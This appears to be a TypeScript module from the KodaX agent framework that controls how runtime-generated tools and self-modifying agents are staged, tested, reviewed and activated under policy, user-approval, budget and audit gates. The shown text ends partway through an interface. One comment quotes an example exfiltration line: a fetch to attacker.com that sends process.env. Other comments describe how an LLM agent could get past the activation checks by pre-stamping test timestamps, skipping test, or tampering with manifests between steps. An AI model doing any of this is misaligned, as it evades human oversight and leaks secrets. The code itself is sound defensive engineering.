/**
 * ConstructionRuntime — stage / test / activate / revoke / list lifecycle
 * for runtime-generated capabilities (FEATURE_087, v0.7.28).
 *
 * Module-level singleton: KodaX runs one runtime per process. Tests
 * reset via `_resetRuntimeForTesting()`. Configuration is overridden
 * through `configureRuntime({ cwd, policy })`.
 *
 * No class boilerplate (KodaX philosophy — small focused functions). The
 * "instance state" is just two module-private variables: `_options` and
 * `_activated`. Persistence is the file system itself; no in-memory
 * artifact cache outside what TOOL_REGISTRY already holds via the
 * unregister-callback map.
 *
 * v0.7.28 Phase 1 scope:
 *   - Lifecycle plumbing only.
 *   - `test()` is intentionally minimal — Guardrail static check + LLM
 *     review + provider schema validator land in Phase 2.
 *   - Policy gate honors a `'reject'` verdict but throws on `'ask-user'`
 *     because Phase 1 has no built-in user-prompt UI; callers (REPL,
 *     test code) must override `constructionPolicy` to wire one.
 */

import path from 'path';
import fs from 'fs/promises';
import crypto from 'crypto';

import { Runner } from '@kodax/core';
import type { LocalToolDefinition } from '../tools/types.js';
import { registerTool } from '../tools/registry.js';
import { defaultToClassifierInput } from '../tools/classifier-projection.js';
import type { KodaXToolDefinition } from '@kodax/ai';

import { buildAdmissionManifest } from './admission-bridge.js';
import {
  _resetAgentResolverForTesting,
  listConstructedAgents,
  registerConstructedAgent,
} from './agent-resolver.js';
import type { Agent as CoreAgent } from '@kodax/core';
import {
  runSandboxAgentTest,
  type SandboxLlmCallback,
} from './sandbox-runner.js';
import { loadHandler } from './load-handler.js';
import { runAstRules } from './ast-rules.js';
import { validateToolSchemaForProvider, type SchemaProvider } from './provider-schema.js';
import { runLlmReview, type LlmReviewClient, type LlmReviewResult } from './llm-review.js';
import {
  appendAuditEntry,
  computeDiffHash,
} from './audit-log.js';
import {
  consumeBudget,
  readBudget,
  remaining as remainingBudget,
} from './budget.js';
import { readDisableState } from './disable-state.js';
import {
  runSelfModifyDiffSummary,
  type SelfModifyDiffSummary,
} from './self-modify-summary.js';
import {
  type ConstructionArtifact,
  type ConstructionPolicy,
  type StagedHandle,
  type TestResult,
  type ToolArtifact,
  type AgentArtifact,
  type AgentContent,
  defaultPolicy,
  ConstructionManifestError,
} from './types.js';

const CONSTRUCTED_ROOT_SUBPATH = path.join('.kodax', 'constructed');

/**
 * Reject artifact identifiers that could escape `.kodax/constructed/<kind>s/`
 * via path traversal. Catches both the obvious cases (`../../etc/passwd`,
 * absolute paths, drive letters) and Windows-reserved characters that
 * would break manifest persistence.
 *
 * Restricts to `[A-Za-z0-9._-]` plus a leading semver-friendly char.
 * Length cap (128) bounds the on-disk path length so a 4 KB filename
 * can't be smuggled in. Not a security boundary on its own — defense in
 * depth alongside the policy gate.
 */
function assertSafeIdentifier(value: unknown, label: string): asserts value is string {
  if (typeof value !== 'string' || value.length === 0 || value.length > 128) {
    throw new ConstructionManifestError(
      `Invalid ${label}: must be a non-empty string ≤ 128 chars (got ${typeof value === 'string' ? `length=${value.length}` : typeof value}).`,
    );
  }
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(value) || value.includes('..')) {
    throw new ConstructionManifestError(
      `Invalid ${label} ${JSON.stringify(value)}: must match [A-Za-z0-9][A-Za-z0-9._-]* with no '..' sequences. Reserved separator/control characters and parent-traversal segments are rejected.`,
    );
  }
}

/** SHA-256 of the artifact's `content` field, hex-encoded. */
function computeContentHash(content: ConstructionArtifact['content']): string {
  return crypto.createHash('sha256').update(JSON.stringify(content)).digest('hex');
}

/**
 * Single source of truth for which artifact kinds the runtime understands.
 * v0.7.28 shipped `'tool'`; FEATURE_089 (v0.7.31) adds `'agent'`. Adding
 * a new kind to this constant + the test/activate dispatch sites is the
 * only change required in this file — `loadAllArtifacts()` and
 * `readArtifactByVersion()` iterate over the constant.
 */
const SUPPORTED_KINDS: ReadonlyArray<ConstructionArtifact['kind']> = ['tool', 'agent'];

/**
 * Input passed to a `SelfModifyAskUser` callback when the activate
 * path detects a self-modify. Carries everything the surface needs
 * to render an informed approve/reject prompt: prev + proposed
 * manifests for raw diff, the LLM summary, and the budget snapshot.
 *
 * Kept separate from FEATURE_088's `ConstructionPolicy` shape so the
 * existing first-time-staging policy flow stays unchanged. The two
 * gates are mutually exclusive — self-modify never reaches
 * `_options.policy`.
 */
export interface SelfModifyAskUserInput {
  readonly agentName: string;
  readonly fromVersion: string;
  readonly toVersion: string;
  readonly prevContent: AgentContent;
  readonly nextContent: AgentContent;
  readonly llmSummary: SelfModifyDiffSummary;
  readonly budgetRemaining: number;
  readonly budgetLimit: number;
}

/**
 * Force-ask-user gate for self-modify activations. Returns the user's
 * verdict; never `'ask-user'` because by reaching this callback we
 * already know we need to ask the user. REPL surfaces wire a
 * dialog-based callback at startup; non-REPL surfaces leave this
 * undefined and self-modify activations hard-fail with a clear
 * configuration error.
 */
export type SelfModifyAskUser = (
  input: SelfModifyAskUserInput,
) => Promise<'approve' | 'reject'>;

interface RuntimeOptions {
  /** Workspace root for `.kodax/constructed/`. Defaults to `process.cwd()`. */
  readonly cwd: string;
  /** Activation policy gate. Defaults to `defaultPolicy` (ask-user). */
  readonly policy: ConstructionPolicy;
  /**
   * FEATURE_090 — optional LLM client used for self-modify diff
   * summaries. When undefined, `runSelfModifyDiffSummary` falls back
   * to the unavailable-summary record (severity='major', user still
   * sees the raw diff). REPL bootstrap binds the same KodaXClient as
   * `test_agent`'s LLM reviewer.
   */
  readonly llmReviewer?: LlmReviewClient;
  /**
   * FEATURE_090 — force-ask-user callback for self-modify activations.
   * Required from any surface that wants self-modify to succeed; if
   * undefined, self-modify activations are rejected (matches the
   * non-interactive default for the regular policy gate).
   */
  readonly selfModifyAskUser?: SelfModifyAskUser;
}

let _options: RuntimeOptions = {
  cwd: process.cwd(),
  policy: defaultPolicy,
};

/**
 * Map of `name@version` → unregister callback returned by registerTool().
 * Populated on activate(); consumed by revoke().
 */
const _activated = new Map<string, () => void>();

export function configureRuntime(overrides: Partial<RuntimeOptions>): void {
  _options = {
    cwd: overrides.cwd ?? _options.cwd,
    policy: overrides.policy ?? _options.policy,
    llmReviewer: overrides.llmReviewer ?? _options.llmReviewer,
    selfModifyAskUser: overrides.selfModifyAskUser ?? _options.selfModifyAskUser,
  };
}

/**
 * Public read of the configured workspace root. FEATURE_090 helpers
 * (`stage_self_modify` budget + audit-log writes) need to point at the
 * SAME directory the rest of the construction runtime reads from, so
 * they read this rather than `process.cwd()` directly. Exporting the
 * getter keeps `_options` private while letting peer modules avoid
 * duplicating "where does the construction runtime live."
 */
export function getRuntimeCwd(): string {
  return _options.cwd;
}

/** Test-only — clears in-memory state. Does not touch the filesystem. */
export function _resetRuntimeForTesting(): void {
  for (const unregister of _activated.values()) {
    unregister();
  }
  _activated.clear();
  _resetAgentResolverForTesting();
  _options = {
    cwd: process.cwd(),
    policy: defaultPolicy,
    llmReviewer: undefined,
    selfModifyAskUser: undefined,
  };
}

// ============================================================
// Public lifecycle
// ============================================================

/**
 * Persist a freshly-built artifact to `.kodax/constructed/<kind>s/<name>/<version>.json`
 * with `status: 'staged'`.
 *
 * Version immutability: if any manifest at the same name+version already
 * exists on disk (in any status — staged, active, or revoked), stage()
 * refuses to overwrite. Bumping the semver is the supported update path.
 *
 * Why "any status", not just `'active'`:
 *   The handler's `.js` module is loaded via `await import(file://…)`
 *   which the ESM module cache keys by absolute file URL. Re-writing
 *   `<version>.js` in place leaves the cached module pointing at the
 *   OLD code; subsequent loadHandler() calls return the cached export.
 *   Even revoking first does not flush the cache (Node has no public
 *   ESM cache eviction API). The only safe-by-construction policy is
 *   "version is immutable on disk — bump semver to update."
 *
 * Lifecycle timestamp reset: `testedAt` / `activatedAt` / `revokedAt`
 * are explicitly cleared on the persisted record, even if the input
 * artifact carries them. Defends against an LLM-supplied artifact
 * pre-stamping testedAt to bypass the activate() gate.
 */
export async function stage(artifact: ConstructionArtifact): Promise<StagedHandle> {
  assertSafeIdentifier(artifact.name, 'artifact.name');
  assertSafeIdentifier(artifact.version, 'artifact.version');

  const target = manifestPath(artifact);
  try {
    const raw = await fs.readFile(target, 'utf8');
    const existing = JSON.parse(raw) as ConstructionArtifact;
    throw new ConstructionManifestError(
      `Cannot stage '${artifact.name}@${artifact.version}': a manifest already exists at this version (status='${existing.status}'). `
      + `Constructed artifacts are version-immutable — bump the semver to publish a new variant. `
      + `Re-staging the same version would silently shadow the cached ESM module, even after revoke.`,
      target,
    );
  } catch (err) {
    if (err instanceof ConstructionManifestError) throw err;
    if ((err as NodeJS.ErrnoException).code !== 'ENOENT') throw err;
    // ENOENT — first time staging this name+version, proceed.
  }

  const filled: ConstructionArtifact = {
    ...artifact,
    status: 'staged',
    createdAt: artifact.createdAt || Date.now(),
    testedAt: undefined,
    activatedAt: undefined,
    revokedAt: undefined,
    contentHash: undefined,
  };

  await persistArtifact(filled);
  return { artifact: filled, stagedAt: Date.now() };
}

/**
 * Validate a staged artifact. Runs the static-only check pipeline:
 *
 *   1. Shape sanity (kind, handler.language, capabilities.tools array).
 *   2. AST hard rules (no-eval / no-Function-constructor / require-handler-signature).
 *   3. provider schema validation (Anthropic by default — main path).
 *   4. LLM static review (only when caller injects `options.llmReviewer`).
 *
 * Verdict dispatch on LLM review:
 *   - 'safe'        → ok=true, no LLM-review warnings.
 *   - 'suspicious'  → ok=true, concerns surfaced as warnings; downstream
 *                     `activate()` will run the policy gate (default
 *                     ask-user) which can show those concerns to the user.
 *   - 'dangerous'   → ok=false, errors carry the LLM concerns; activate
 *                     will not be reachable without a fresh stage().
 *
 * IMPORTANT — handler is NOT materialized here. The earlier "materialize
 * handler to surface syntax errors" step performed `await import(file://…)`
 * BEFORE the policy gate, which executed the handler module's top-level
 * code as a side effect. AST rules cover `eval` / `Function`, but a
 * top-level `await fetch('http://attacker.com', { body: process.env })`
 * was unguarded — see DD §14.5 threat model. loadHandler() now happens
 * exclusively inside `activate()` after the policy verdict is `'approve'`,
 * making the policy gate the single chokepoint for code execution.
 *
 * The LLM reviewer is opt-in: tests and Phase 1 callers that don't pass
 * a client get the deterministic AST + schema path only.
 */
export interface TestArtifactOptions {
  /** Provider whose tool schema constraints are checked. Defaults to 'anthropic'. */
  readonly provider?: SchemaProvider;
  /** Inject a real or mock LLM client to run static review. Optional. */
  readonly llmReviewer?: LlmReviewClient;
  /**
   * FEATURE_089 Phase 3.5 — sandbox test runner LLM callback. When
   * supplied AND the artifact is `kind: 'agent'` AND `content.testCases`
   * is non-empty, `testAgentArtifact` runs each test case through
   * `Runner.run` with this callback and folds the results into
   * `TestResult.errors` / `TestResult.warnings`. When omitted, agent
   * test pipeline runs only the manifest shape + admission audit
   * — cases are skipped silently (caller's choice not to sandbox).
   */
  readonly sandboxLlm?: SandboxLlmCallback;
  /**
   * Per-case wall-clock budget for sandbox cases. Forwarded to
   * `runSandboxAgentTest`. Defaults to 30s when undefined.
   */
  readonly sandboxBudgetMs?: number;
}

export async function test(
  handle: StagedHandle,
  options: TestArtifactOptions = {},
): Promise<TestResult> {
  const { artifact } = handle;
  if (artifact.kind === 'tool') {
    return testToolArtifact(artifact, options);
  }
  if (artifact.kind === 'agent') {
    return testAgentArtifact(artifact, options);
  }
  // Discriminant exhaustiveness: if a future kind lands without a
  // dispatch case, the type system would have caught it at the union
  // edit; this branch defends against runtime data whose 'kind' field
  // doesn't match the type contract.
  return {
    ok: false,
    errors: [
      `Unsupported artifact kind '${(artifact as { kind?: string }).kind ?? '<missing>'}'. ` +
        `Runtime understands: ${SUPPORTED_KINDS.join(', ')}.`,
    ],
  };
}

async function testToolArtifact(
  artifact: ToolArtifact,
  options: TestArtifactOptions,
): Promise<TestResult> {
  const errors: string[] = [];
  const warnings: string[] = [];

  // 1. Shape sanity
  if (artifact.content.handler.language !== 'javascript') {
    errors.push(`Handler language must be 'javascript' (got '${artifact.content.handler.language}').`);
  }
  if (!Array.isArray(artifact.content.capabilities.tools)) {
    errors.push('capabilities.tools must be an array of strings.');
  } else {
    for (const t of artifact.content.capabilities.tools) {
      if (typeof t !== 'string' || t.trim().length === 0) {
        errors.push(`capabilities.tools entry must be a non-empty string (got: ${JSON.stringify(t)}).`);
        break;
      }
    }
  }

  if (errors.length > 0) {
    return { ok: false, errors };
  }

  // 2. AST hard rules
  const ast = runAstRules(artifact.content.handler.code);
  if (!ast.ok) {
    for (const v of ast.violations) {
      errors.push(`[${v.rule}] ${v.message}`);
    }
    return { ok: false, errors };
  }

  // 3. Provider schema validation
  const schemaResult = validateToolSchemaForProvider(
    artifact.content.inputSchema,
    options.provider ?? 'anthropic',
  );
  for (const w of schemaResult.warnings) warnings.push(w);
  if (!schemaResult.ok) {
    for (const e of schemaResult.errors) errors.push(`[schema] ${e}`);
    return { ok: false, errors, warnings };
  }

  // 4. LLM static review (opt-in)
  if (options.llmReviewer) {
    let review: LlmReviewResult;
    try {
      review = await runLlmReview(
        {
          handlerCode: artifact.content.handler.code,
          capabilities: artifact.content.capabilities,
          artifactRef: `${artifact.name}@${artifact.version}`,
        },
        options.llmReviewer,
      );
    } catch (err) {
      // Defense in depth: a reviewer that fails to produce a verdict is
      // not authoritative. Treat as 'dangerous' — caller may retry.
      errors.push(`LLM review failed to produce a verdict: ${(err as Error).message}`);
      return { ok: false, errors, warnings };
    }

    if (review.verdict === 'dangerous') {
      errors.push(`LLM review verdict='dangerous'.`);
      for (const c of review.concerns) errors.push(`[review] ${c}`);
      return { ok: false, errors, warnings };
    }
    if (review.verdict === 'suspicious') {
      warnings.push(`LLM review verdict='suspicious' — policy gate will see these concerns:`);
      for (const c of review.concerns) warnings.push(`[review] ${c}`);
    }
    // 'safe' → no further action.
  }

  // Persist a NEW artifact with testedAt set (immutable update — never
  // mutate the input). The persisted record drives the activate() gate.
  const tested: ToolArtifact = { ...artifact, testedAt: Date.now() };
  await persistArtifact(tested);
  return warnings.length > 0 ? { ok: true, warnings } : { ok: true };
}

/**
 * FEATURE_089 (v0.7.31) — agent-kind static check pipeline. Two stages:
 *
 *   1. Surface shape check — same conservative bar as the v0.7.28 tool
 *      pipeline (instructions present + non-empty; tools/refs
 *      well-formed). Cheap fast-fail before the heavier admission pass.
 *   2. FEATURE_101 admission audit — `buildAdmissionManifest` lifts the
 *      `AgentContent` to an `AgentManifest`; `Runner.admit` runs the
 *      5-step audit (schema → invariants → cap composition → patch
 *      apply). Reject becomes errors[]; clamp becomes warnings[]; ok
 *      records `testedAt` and persists.
 *
 * Admission registration is the caller's concern (REPL bootstrap calls
 * `registerCodingInvariants()` once on startup). Tests that exercise
 * the agent path register-and-reset around their describe blocks; see
 * `runtime-agent-admit.test.ts`.
 */
async function testAgentArtifact(
  artifact: AgentArtifact,
  options: TestArtifactOptions,
): Promise<TestResult> {
  const errors: string[] = [];
  const warnings: string[] = [];

  // 1. Surface shape check.
  if (typeof artifact.content.instructions !== 'string' || artifact.content.instructions.length === 0) {
    errors.push('agent.content.instructions must be a non-empty string.');
  }
  if (artifact.content.tools !== undefined) {
    if (!Array.isArray(artifact.content.tools)) {
      errors.push('agent.content.tools, when present, must be an array of ToolRef objects.');
    } else {
      for (let i = 0; i < artifact.content.tools.length; i += 1) {
        const ref = (artifact.content.tools[i] as { ref?: unknown } | undefined)?.ref;
        if (typeof ref !== 'string' || ref.length === 0) {
          errors.push(`agent.content.tools[${i}].ref must be a non-empty string.`);
          break;
        }
      }
    }
  }
  if (errors.length > 0) {
    return { ok: false, errors };
  }

  // 2. FEATURE_101 admission — full 5-step audit.
  // FEATURE_101 v0.7.31.1 patch: thread activated + staged agent maps so
  // `handoffLegality` sees the full cross-manifest graph (not just the
  // single manifest in isolation). Without the staged map, two manifests
  // submitted in the same batch with mutual handoffs would each admit
  // because neither sees the other yet.
  const manifest = buildAdmissionManifest({ name: artifact.name, content: artifact.content });
  const verdict = await Runner.admit(manifest, {
    activatedAgents: await buildActivatedAgentsMap(),
    stagedAgents: await buildStagedAgentsMap(artifact.name),
  });
  if (!verdict.ok) {
    errors.push(`[admission] ${verdict.reason} (retryable=${verdict.retryable})`);
    return { ok: false, errors };
  }
  for (const note of verdict.clampNotes) {
    warnings.push(`[admission] ${note}`);
  }

  // 3. FEATURE_089 Phase 3.5 — sandbox test cases. Runs only when
  // a sandbox LLM is wired AND the manifest declares testCases. The
  // resolved Agent override is built directly from the manifest so
  // we don't have to register-then-revoke around the test (which
  // would race against rehydrate or concurrent admit checks).
  const cases = artifact.content.testCases ?? [];
  if (cases.length > 0 && options.sandboxLlm) {
    // Build a transient Agent from the admitted manifest. We don't
    // call `registerConstructedAgent` because that would expose this
    // un-policy-gated agent to other consumers mid-test.
    const resolvedAgent = {
      name: manifest.name,
      instructions: manifest.instructions,
      ...(manifest.tools ? { tools: manifest.tools } : {}),
      ...(manifest.handoffs ? { handoffs: manifest.handoffs } : {}),
      ...(manifest.reasoning ? { reasoning: manifest.reasoning } : {}),
    };
    const sandbox = await runSandboxAgentTest(artifact, {
      llm: options.sandboxLlm,
      budgetMs: options.sandboxBudgetMs,
      resolvedAgent,
    });
    for (const c of sandbox.cases) {
      if (!c.ok) errors.push(`[sandbox:${c.caseId}] ${c.error ?? 'failed'}`);
    }
    if (!sandbox.ok) {
      return { ok: false, errors, warnings };
    }
  }

  const tested: AgentArtifact = { ...artifact, testedAt: Date.now() };
  await persistArtifact(tested);
  return warnings.length > 0 ? { ok: true, warnings } : { ok: true };
}

/**
 * Activate a staged-and-tested artifact: invoke policy gate, materialize
 * the handler, register into TOOL_REGISTRY, persist `status='active'`.
 *
 * Throws `'reject'` policy verdicts as errors. `'ask-user'` requires the
 * caller to have overridden the policy (Phase 1 has no built-in prompt UI).
 *
 * Pre-conditions:
 *   - artifact.testedAt must be set (test() must have run successfully).
 *     Without this gate the AST/schema/LLM-review chain could be skipped
 *     entirely by an LLM that calls activate_tool directly after stage_tool.
 *   - artifact.status must not be 'revoked' (terminal).
 *
 * Side-effects:
 *   - loadHandler() runs `await import(file://…)` AFTER policy approval.
 *     The handler module's top-level code only executes once policy says
 *     'approve'. This makes the policy gate the single chokepoint for
 *     code execution; the handler does not run during test().
 *   - Records `contentHash = sha256(JSON.stringify(content))` so
 *     rehydrate at the next boot can detect cross-session manifest
 *     tampering (see ConstructionArtifact.contentHash for threat model).
 */
export async function activate(handle: StagedHandle): Promise<void> {
  const initial = handle.artifact;

  assertSafeIdentifier(initial.name, 'artifact.name');
  assertSafeIdentifier(initial.version, 'artifact.version');

  // Filesystem is the source of truth (DD §14.1). Re-read the persisted
  // record so this function works whether the caller threaded the latest
  // testedAt / status onto the in-memory handle or not — keeps the
  // `stage → test → activate` chain composable and matches the
  // `toolActivateTool` builtin path which also re-reads from disk.
  const artifact = await readArtifactByVersion(initial.name, initial.version);
  if (!artifact) {
    throw new Error(
      `Cannot activate '${initial.name}@${initial.version}': artifact not found on disk. Stage and test it first.`,
    );
  }

  // Lifecycle guard: revoked artifacts are terminal — re-activation must
  // go through a fresh stage(name, newVersion). Re-activating an already-
  // active artifact short-circuits to the idempotent re-register path
  // below (preserves the same `_activated` map entry).
  if (artifact.status === 'revoked') {
    throw new Error(
      `Cannot activate '${artifact.name}@${artifact.version}': artifact is revoked. `
      + `Revoked artifacts are terminal; bump the version and re-stage.`,
    );
  }
  if (!artifact.testedAt) {
    throw new Error(
      `Cannot activate '${artifact.name}@${artifact.version}': artifact has not passed test(). `
      + `Call test_tool first — activation must follow the AST/schema/LLM-review chain so the policy gate is not the only line of defense.`,
    );
  }

  // FEATURE_089 Phase 3.6 review fix — re-run admission on agent kind.
  // The within-session window between `test_agent` (admission stamps
  // testedAt) and `activate_agent` is exploitable by an LLM with
  // filesystem write access: an attacker could overwrite the persisted
  // manifest after admission passed but before activate registers it
  // in the resolver. The `contentHash` recorded below only protects
  // cross-session integrity (rehydrate compares hashes); within a
  // single session it's set AFTER tampering would have happened.
  // Re-running admission here closes the window. Tools have their own
  // safety chain (AST + materialize) so this re-validation is
  // agent-specific.
  //
  // FEATURE_101 v0.7.31.1: capture the `AdmittedHandle` so we can
  // thread `invariantBindings` + admitted manifest into the resolver
  // registration. `Runner.run` consults the bindings to dispatch
  // observe / assertTerminal hooks at run time.
  let admittedHandle: import('@kodax/core').AdmittedHandle | undefined;
  if (artifact.kind === 'agent') {
    const manifest = buildAdmissionManifest({
      name: artifact.name,
      content: artifact.content,
    });
    const verdict = await Runner.admit(manifest, {
      activatedAgents: await buildActivatedAgentsMap(),
      stagedAgents: await buildStagedAgentsMap(artifact.name),
    });
    if (!verdict.ok) {
      throw new Error(
        `Cannot activate '${artifact.name}@${artifact.version}': re-admission at activate-time failed. `
        + `${verdict.reason} (retryable=${verdict.retryable}). `
        + `This indicates the persisted manifest changed between test_agent and activate_agent — `
        + `re-stage with a fresh version.`,
      );
    }
    admittedHandle = verdict.handle;
  }

  // FEATURE_090 (v0.7.32) — self-modify gate.
  //
  // Self-modify is detected when the artifact carries an explicit
  // sourceAgent claim equal to its own name AND a different version
  // of the same name is currently active. Both conditions must hold:
  //   - sourceAgent === name proves the staging tool that produced
  //     this manifest was `stage_self_modify` (the only path that
  //     stamps that field with that semantics).
  //   - prev active version exists because self-modify is, by
  //     definition, modifying an existing agent.
  //
  // When self-modify is detected, the regular FEATURE_088 policy
  // gate is BYPASSED — replaced by force-ask-user with an LLM diff
  // summary attached. The two gates are mutually exclusive.
  const selfModifyPrev = await detectSelfModify(artifact);
  if (selfModifyPrev) {
    await runSelfModifyActivation({
      next: artifact,
      prev: selfModifyPrev,
      admittedHandle,
    });
    return;
  }

  const verdict = await _options.policy(artifact);
  if (verdict === 'reject') {
    throw new Error(
      `Construction policy rejected '${artifact.name}@${artifact.version}'.`,
    );
  }
  if (verdict === 'ask-user') {
    // The REPL surface binds a dialog-based policy in
    // packages/repl/src/common/construction-bootstrap.ts so 'ask-user'
    // never reaches here on the interactive path. Hitting this branch
    // means activation was attempted from a non-interactive surface
    // whose policy was left at the default (returns 'ask-user' but no
    // UI to ask through) — treat as a configuration error.
    throw new Error(
      `Construction policy returned 'ask-user' for '${artifact.name}@${artifact.version}', `
      + `but the current surface has no interactive UI bound. Activation must originate from a session whose policy can prompt the user (e.g. the Ink REPL).`,
    );
  }

  await registerActiveArtifact(artifact, { admittedHandle });

  // Immutable update — persist a NEW artifact record rather than mutating
  // the caller's reference. Records contentHash for rehydrate integrity.
  const activated: ConstructionArtifact = {
    ...artifact,
    status: 'active',
    activatedAt: Date.now(),
    contentHash: computeContentHash(artifact.content),
  };
  await persistArtifact(activated);
}

/**
 * Detect whether the activation is a self-modify by looking for a
 * still-active prior version of the same name. Returns the prior
 * `AgentArtifact` when both conditions hold (sourceAgent stamp +
 * active prev), `undefined` otherwise.
 *
 * The caller treats `undefined` as "fall through to FEATURE_088
 * policy gate." This keeps the existing first-time-staging path
 * unchanged when the manifest happens to carry a `sourceAgent`
 * field (e.g. an agent that generated *another* agent — sourceAgent
 * points at the generator, not the artifact itself).
 */
async function detectSelfModify(
  artifact: ConstructionArtifact,
): Promise<AgentArtifact | undefined> {
  if (artifact.kind !== 'agent') return undefined;
  if (!artifact.sourceAgent || artifact.sourceAgent !== artifact.name) {
    return undefined;
  }
  const all = await loadAllArtifacts(_options.cwd, 'agent');
  return all.find(
    (a): a is AgentArtifact =>
      a.kind === 'agent'
      && a.name === artifact.name
      && a.status === 'active'
      && a.version !== artifact.version,
  );
}

interface SelfModifyActivationInput {
  readonly next: ConstructionArtifact;
  readonly prev: AgentArtifact;
  readonly admittedHandle: import('@kodax/core').AdmittedHandle | undefined;
}

/**
 * Self-modify activation orchestration:
 *
 *   1. Run the LLM diff summary (graceful fallback on no client).
 *   2. Snapshot the current budget (used both for ask-user UI and
 *      audit logging — the snapshot is BEFORE consume).
 *   3. Force-ask-user via the configured callback. No callback wired
 *      → hard fail (mirrors the FEATURE_088 'ask-user' fallthrough
 *      error). Also requires the next artifact to be `kind: 'agent'`
 *      — defensive narrowing since detectSelfModify already gated.
 *   4. On reject: write `self_modify_rejected` audit and throw.
 *   5. On approve: consume budget, register active, persist
 *      `status='active'`, write `self_modify_activated` audit. The
 *      registry registration goes through `registerActiveArtifact`
 *      same as the regular path; FEATURE_090 P4 will retrofit a
 *      `deferred` flag here so the in-flight Runner.run keeps the
 *      old version for the rest of its execution.
 */
async function runSelfModifyActivation(
  input: SelfModifyActivationInput,
): Promise<void> {
  const { next, prev } = input;
  // detectSelfModify already proved kind === 'agent', narrow for TS.
  if (next.kind !== 'agent') {
    throw new Error(
      `runSelfModifyActivation: expected kind='agent', got '${next.kind}'.`,
    );
  }

  // 1. LLM diff summary — advisory, not load-bearing. Always succeeds
  //    (returns the fallback record on failure).
  const llmSummary = _options.llmReviewer
    ? await runSelfModifyDiffSummary(
        {
          agentName: next.name,
          fromVersion: prev.version,
          toVersion: next.version,
          prev: prev.content,
          next: next.content,
        },
        _options.llmReviewer,
      )
    : ({
        summary:
          'No LLM reviewer configured — review the raw manifest diff before approving.',
        severity: 'major',
        flaggedConcerns: ['No LLM reviewer wired into the runtime; summary skipped.'],
      } satisfies SelfModifyDiffSummary);

  // 2a. Disable check. Operator-set marker hard-rejects activation
  //     even though stage may have predated the disable. We catch the
  //     race here at the activate boundary so the disable verdict is
  //     authoritative regardless of which side of the stage call it
  //     was set.
  const disableState = await readDisableState(next.name, { cwd: _options.cwd });
  if (disableState.disabled) {
    await appendAuditEntry(
      {
        ts: new Date().toISOString(),
        event: 'self_modify_rejected',
        agentName: next.name,
        toVersion: next.version,
        fromVersion: prev.version,
        diffHash: computeDiffHash(prev.content, next.content),
        rejectRule: 'self-modify-disabled',
        rejectReason:
          'Self-modify is disabled for this agent; the disable marker was found at activate time.',
      },
      { cwd: _options.cwd },
    );
    throw new Error(
      `Self-modify is disabled for '${next.name}'. The activate request is rejected; bump version + author a separately-named agent if a different posture is required.`,
    );
  }

  // 2b. Budget snapshot (pre-consume).
  const budgetState = await readBudget(next.name, { cwd: _options.cwd });
  const budgetRemaining = remainingBudget(budgetState);
  if (budgetRemaining <= 0) {
    // stage_self_modify also checks budget at stage time, but a
    // resourceful caller could stage when budget=1 and then activate
    // after another self-modify already consumed the slot. Re-check
    // here so the budget invariant holds at the only moment that
    // matters — the activate boundary.
    await appendAuditEntry(
      {
        ts: new Date().toISOString(),
        event: 'self_modify_rejected',
        agentName: next.name,
        toVersion: next.version,
        fromVersion: prev.version,
        diffHash: computeDiffHash(prev.content, next.content),
        budgetRemaining: 0,
        rejectRule: 'budget-exhausted',
        rejectReason:
          'Modification budget was exhausted between stage and activate.',
      },
      { cwd: _options.cwd },
    );
    throw new Error(
      `Cannot activate self-modify of '${next.name}@${next.version}': budget exhausted between stage and activate. Run 'kodax constructed reset-self-modify-budget ${next.name}' to unlock.`,
    );
  }

  // 3. Force-ask-user.
  if (!_options.selfModifyAskUser) {
    throw new Error(
      `Self-modify activation of '${next.name}@${next.version}' requires an interactive surface that wires \`selfModifyAskUser\` via configureRuntime. The current surface has none — activation rejected.`,
    );
  }
  const verdict = await _options.selfModifyAskUser({
    agentName: next.name,
    fromVersion: prev.version,
    toVersion: next.version,
    prevContent: prev.content,
    nextContent: next.content,
    llmSummary,
    budgetRemaining,
    budgetLimit: budgetState.limit,
  });

  const diffHash = computeDiffHash(prev.content, next.content);
  if (verdict === 'reject') {
    await appendAuditEntry(
      {
        ts: new Date().toISOString(),
        event: 'self_modify_rejected',
        agentName: next.name,
        toVersion: next.version,
        fromVersion: prev.version,
        diffHash,
        llmSummary: llmSummary.summary,
        severity: llmSummary.severity,
        flaggedConcerns: llmSummary.flaggedConcerns,
        policyVerdict: 'reject',
        budgetRemaining,
        rejectRule: 'user-rejected',
        rejectReason: 'User rejected the self-modify proposal at the activate gate.',
      },
      { cwd: _options.cwd },
    );
    throw new Error(
      `User rejected self-modify of '${next.name}@${next.version}'.`,
    );
  }

  // 4. Approve path — consume budget, register (deferred), persist,
  //    audit. `deferred: true` routes registration into the resolver's
  //    pending swap queue so the in-flight Runner.run that triggered
  //    the modification keeps using its captured (prior-version) Agent
  //    reference. The REPL surface calls `drainPendingSwaps()` after
  //    the top-level run completes to promote the new version.
  const postConsume = await consumeBudget(next.name, { cwd: _options.cwd });
  await registerActiveArtifact(next, {
    admittedHandle: input.admittedHandle,
    deferred: true,
  });
  const activated: ConstructionArtifact = {
    ...next,
    status: 'active',
    activatedAt: Date.now(),
    contentHash: computeContentHash(next.content),
  };
  await persistArtifact(activated);
  await appendAuditEntry(
    {
      ts: new Date().toISOString(),
      event: 'self_modify_activated',
      agentName: next.name,
      toVersion: next.version,
      fromVersion: prev.version,
      diffHash,
      llmSummary: llmSummary.summary,
      severity: llmSummary.severity,
      flaggedConcerns: llmSummary.flaggedConcerns,
      policyVerdict: 'force-ask-user',
      budgetRemaining: remainingBudget(postConsume),
    },
    { cwd: _options.cwd },
  );
}

/**
 * Internal: load handler + register into TOOL_REGISTRY without going
 * through the policy gate. Used by `activate()` (after policy approval)
 * and by `rehydrateActiveArtifacts()` (where the artifact was already
 * approved in a previous session — re-prompting on each startup is wrong
 * UX).
 *
 * Idempotent on the same name@version: existing registration is
 * unregistered before the new one is pushed, preventing double entries.
 *
 * FEATURE_101 v0.7.31.1: `options.admittedHandle` is passed by `activate`
 * after re-admission (so the resolver can attach invariant bindings to
 * the runnable Agent). `rehydrateActiveArtifacts` does not have a fresh
 * handle — it re-runs admission on hydrate to recover bindings, which
 * is cheaper than persisting them and more robust against drift between
 * the persisted manifest and the registered invariant set.
 */
interface RegisterActiveOptions {
  readonly admittedHandle?: import('@kodax/core').AdmittedHandle;
  /**
   * FEATURE_090 — when true, agent kind registers into the resolver's
   * pending swap queue instead of the active registry. Lookups
   * continue returning the prior active version until
   * `drainPendingSwaps()` runs. Tool kind ignores this flag — there
   * is no "in-flight tool execution" analogue to shield from a swap.
